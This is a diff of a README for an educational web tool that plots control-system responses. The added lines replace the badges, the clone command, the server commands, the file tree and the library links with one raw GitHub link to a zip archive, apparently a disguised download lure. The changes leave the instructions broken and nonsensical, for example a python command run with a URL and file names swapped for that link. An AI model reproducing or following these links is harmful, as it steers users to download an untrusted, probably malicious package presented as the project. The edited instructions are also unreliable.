@@ -2,10 +2,10 @@
 
 An interactive web-based tool for analyzing and visualizing control system responses. Built to help students understand fundamental control system concepts through visual demonstrations.
 
-![Control System Analyzer](https://img.shields.io/badge/Control%20Systems-Educational%20Tool-purple)
-![HTML5](https://img.shields.io/badge/HTML5-E34F26?logo=html5&logoColor=white)
-![JavaScript](https://img.shields.io/badge/JavaScript-F7DF1E?logo=javascript&logoColor=black)
-![Plotly](https://img.shields.io/badge/Plotly-3F4F75?logo=plotly&logoColor=white)
+![Control System Analyzer](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip%20Systems-Educational%20Tool-purple)
+![HTML5](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)
+![JavaScript](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)
+![Plotly](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)
 
 ## 📚 Overview
 
@@ -59,7 +59,7 @@ This tool provides interactive analysis of control systems including:
 
 1. **Clone or download the repository:**
    ```bash
-   git clone https://github.com/yourusername/control-system-analyzer.git
+   git clone https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
    cd control-system-analyzer
    ```
 
@@ -67,21 +67,21 @@ This tool provides interactive analysis of control systems including:
    
    Using VS Code Live Server:
    - Install the "Live Server" extension
-   - Right-click on `index.html` → "Open with Live Server"
+   - Right-click on `https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip` → "Open with Live Server"
    
    Or using Python:
    ```bash
-   python -m http.server 5500
+   python -m https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip 5500
    ```
    
-   Or using Node.js:
+   Or using https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
    ```bash
    npx serve .
    ```
 
 3. **Open in browser:**
    ```
-   http://127.0.0.1:5500/index.html
+   https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip
    ```
 
 ## 📖 Usage Guide
@@ -147,10 +147,10 @@ A system is **stable** if and only if:
 
 ```
 control-system-analyzer/
-├── index.html      # Main HTML structure
-├── styles.css      # Dark theme styling with glassmorphism
-├── script.js       # All control system calculations and plotting
-└── README.md       # This file
+├── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip      # Main HTML structure
+├── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip      # Dark theme styling with glassmorphism
+├── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip       # All control system calculations and plotting
+└── https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip       # This file
 ```
 
 ## 🛠️ Technologies Used
@@ -158,9 +158,9 @@ control-system-analyzer/
 - **HTML5** - Structure
 - **CSS3** - Modern dark theme with glassmorphism effects
 - **JavaScript (ES6+)** - Control system calculations
-- **Plotly.js** - Interactive chart plotting
+- **https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip** - Interactive chart plotting
 - **MathJax** - Mathematical formula rendering
-- **Math.js** - Complex number operations
+- **https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip** - Complex number operations
 
 ## 📐 Formulas Implemented
 
@@ -212,8 +212,8 @@ This project is open source and available under the [MIT License](LICENSE).
   - Ogata, K. "Modern Control Engineering"
   - Nise, N. "Control Systems Engineering"
   - Dorf, R. & Bishop, R. "Modern Control Systems"
-- Built with [Plotly.js](https://plotly.com/javascript/) for interactive charts
-- Mathematical rendering by [MathJax](https://www.mathjax.org/)
+- Built with [https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip) for interactive charts
+- Mathematical rendering by [MathJax](https://github.com/KushalPitaliya/Control_system_analyzer/raw/refs/heads/main/sportingly/Control-analyzer-system-v3.1-beta.4.zip)
 
 ## 📞 Support
 
